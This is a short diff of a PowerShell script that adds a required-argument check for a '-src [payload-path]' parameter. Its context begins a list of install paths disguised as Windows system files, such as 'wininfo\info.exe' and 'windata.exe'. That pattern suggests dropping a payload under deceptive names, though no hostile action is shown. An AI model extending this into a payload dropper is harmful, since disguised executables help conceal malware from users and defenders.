@@ -3,6 +3,11 @@ param (
     [string]$src
 )
 
+if (-not $src) {
+    Write-Host "Error: The -src [payload-path] argument is required." -ForegroundColor Red
+    exit 1
+}
+
 $paths = @(
     "C:\ProgramData\wininfo\info.exe",
     "C:\Windows\Temp\windata\windata.exe",
